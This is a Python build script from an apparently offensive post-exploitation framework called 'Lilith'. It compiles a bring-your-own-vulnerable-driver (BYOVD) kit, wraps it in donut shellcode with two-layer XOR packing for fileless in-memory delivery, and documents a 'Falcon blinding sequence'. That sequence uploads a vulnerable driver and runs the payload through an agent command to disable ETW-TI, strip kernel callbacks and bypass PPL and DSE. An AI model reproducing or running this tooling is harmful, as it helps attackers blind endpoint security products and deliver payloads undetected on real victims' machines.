"""
Lilith — BYOVD Kit Builder

Two build modes:

  build_byovd(output_exe)
    → Regular GUI PE (MessageBoxW output).  Drop on disk, run interactively.

  build_byovd_sc(driver_path, ops, output_enc)
    → Silent PE (WriteConsoleW/WriteFile stdout) wrapped in donut shellcode,
      packed with two-layer XOR like every other tool.  Served by the HTTPS
      server and injected in-memory via the agent `byovdrun` command.

      The .sys driver file still needs to be uploaded to disk before running
      (NtLoadDriver takes a registry path to a .sys file — unavoidable), but
      byovd.exe itself never touches disk.

Capabilities:
  ETW-TI disable, ObRegisterCallbacks removal, Psp notify-callback removal,
  DKOM, PPL bypass, DSE bypass, HVCI check, RTCore64 / gdrv / WinRing0x64
  PTE remapping (--pte-exec) — execute shellcode as ntdll code, no RX VAD entry

Recommended Falcon blinding sequence (fileless path):
  1.  agent> upload C:\\Windows\\Temp\\rtc.sys
  2.  agent> upload C:\\Windows\\Temp\\agent.bin  (next-stage SC, optional)
  3.  agent> byovdrun /cdn/static/v3/byovd.enc
      (server had: lilith build --byovd --driver-path C:\\Windows\\Temp\\rtc.sys
                                         --ops "--etwti --remove-callbacks --pte-exec C:\\Windows\\Temp\\agent.bin")
"""

import os
import shutil
import subprocess
import tempfile

_TEMPLATE = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                         "templates", "byovd_template.c")
_CC = "x86_64-w64-mingw32-g++"   # C++ for lambda auto-capture in template


def _compile_byovd(output_exe: str, silent: bool = False) -> bool:
    """Core compile step.  silent=True adds -DLT_BYOVD_SILENT (stdout instead of MessageBox)."""
    if not os.path.exists(_TEMPLATE):
        print(f"[!] BYOVD template not found: {_TEMPLATE}")
        return False
    if not shutil.which(_CC):
        print(f"[!] Compiler not found: {_CC}")
        print("    Install: apt install g++-mingw-w64-x86-64")
        return False

    tmpdir  = tempfile.mkdtemp(prefix="lt_byovd_")
    src     = os.path.join(tmpdir, "byovd.cpp")
    exe_tmp = os.path.join(tmpdir, "byovd.exe")
    shutil.copy(_TEMPLATE, src)

    cmd = [
        _CC,
        "-std=c++14",
        "-O2", "-s",
        "-Wall", "-Wno-unused-variable", "-Wno-unused-function",
        "-mno-stack-arg-probe",
        "-fno-ident",
        "-fno-exceptions",
        "-fno-asynchronous-unwind-tables",
        "-fno-stack-protector",
        "-fno-builtin-memcpy",
        "-fno-builtin-memset",
        "-nostdlib",
        "-Wl,--no-seh",
        "-Wl,-e,BVDEntry",
        src,
        "-o", exe_tmp,
        "-lgcc",
        "-lkernel32",
        "-ladvapi32",
        "-lpsapi",
        "-luser32",    # MessageBoxW (no-op in SILENT mode but keeps symbol resolution clean)
        "-lshell32",   # CommandLineToArgvW
    ]
    if silent:
        cmd.insert(1, "-DLT_BYOVD_SILENT")

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[!] BYOVD compile error:\n{result.stderr}")
        shutil.rmtree(tmpdir)
        return False

    abs_out = os.path.abspath(output_exe)
    shutil.copy(exe_tmp, abs_out)
    shutil.rmtree(tmpdir)
    return True


def build_byovd(output_exe: str = "byovd.exe") -> bool:
    """Compile byovd_template.c into a standalone GUI PE (MessageBoxW output).
    For manual drop-and-run on target.  Returns True on success."""
    if not _compile_byovd(output_exe, silent=False):
        return False
    size = os.path.getsize(output_exe)
    print(f"[+] BYOVD kit  : {os.path.abspath(output_exe)} ({size:,} bytes)  [GUI/interactive]")
    print( "    Capabilities : ETW-TI · OB callbacks · Psp callbacks · DKOM · PPL · DSE · HVCI")
    print( "    Deploy       : upload driver.sys + byovd.exe, then run manually")
    return True


def build_byovd_sc(
    driver_path: str = r"C:\Windows\Temp\driver.sys",
    ops:         str = "--etwti --remove-callbacks --remove-ob-callbacks",
    output_enc:  str = "byovd.enc",
) -> bool:
    """Compile byovd in SILENT mode, wrap in donut shellcode, pack with two-layer XOR.

    The resulting .enc is served by the HTTPS server and run in-memory via the
    agent `byovdrun` command — byovd.exe itself never touches disk.

    driver_path : the path where the .sys will be on the TARGET (upload it first).
    ops         : BYOVD operations to bake in (default: full Falcon blinding).
    output_enc  : output path for the encoded shellcode.
    """
    from builders.runner import _donut_shellcode
    from core.encoding import pack_enc

    args = f"--driver {driver_path} {ops}".strip()
    print(f"[*] Building fileless BYOVD shellcode…")
    print(f"    Baked args : {args}")

    with tempfile.TemporaryDirectory(prefix="lt_bvds_") as tmpd:
        silent_exe = os.path.join(tmpd, "byovd_s.exe")
        if not _compile_byovd(silent_exe, silent=True):
            return False
        shellcode = _donut_shellcode(silent_exe, args)

    if shellcode is None:
        print("[!] donut failed — install donut-shellcode (pip install donut-shellcode) or donut binary")
        return False

    abs_out = os.path.abspath(output_enc)
    with open(abs_out, "wb") as f:
        f.write(pack_enc(shellcode))

    print(f"[+] BYOVD shellcode : {abs_out} ({len(shellcode)/1024:.1f} KB)  [fileless]")
    print(f"    Driver path (baked) : {driver_path}")
    print(f"    Operations  (baked) : {ops}")
    print(f"    Agent command       : byovdrun /cdn/static/v3/{os.path.basename(abs_out)}")
    print(f"    (upload driver first: agent> upload {driver_path})")
    return True


if __name__ == "__main__":
    import argparse, sys
    p = argparse.ArgumentParser(description="Build Lilith BYOVD kit")
    p.add_argument("-o",  "--output",      default="byovd.exe",
                   help="Output exe path (GUI mode)")
    p.add_argument("--sc",                 action="store_true",
                   help="Also build fileless shellcode variant (byovd.enc)")
    p.add_argument("--driver-path",        default=r"C:\Windows\Temp\driver.sys",
                   help="Driver path baked into shellcode (target path)")
    p.add_argument("--ops",
                   default="--etwti --remove-callbacks --remove-ob-callbacks",
                   help="BYOVD operations to bake into shellcode "
                        "(append --pte-exec <path> for no-RX shellcode injection)")
    p.add_argument("--enc-out",            default="byovd.enc",
                   help="Output .enc path for shellcode variant")
    args = p.parse_args()

    ok = build_byovd(args.output)
    if ok and args.sc:
        ok = build_byovd_sc(args.driver_path, args.ops, args.enc_out)
    sys.exit(0 if ok else 1)
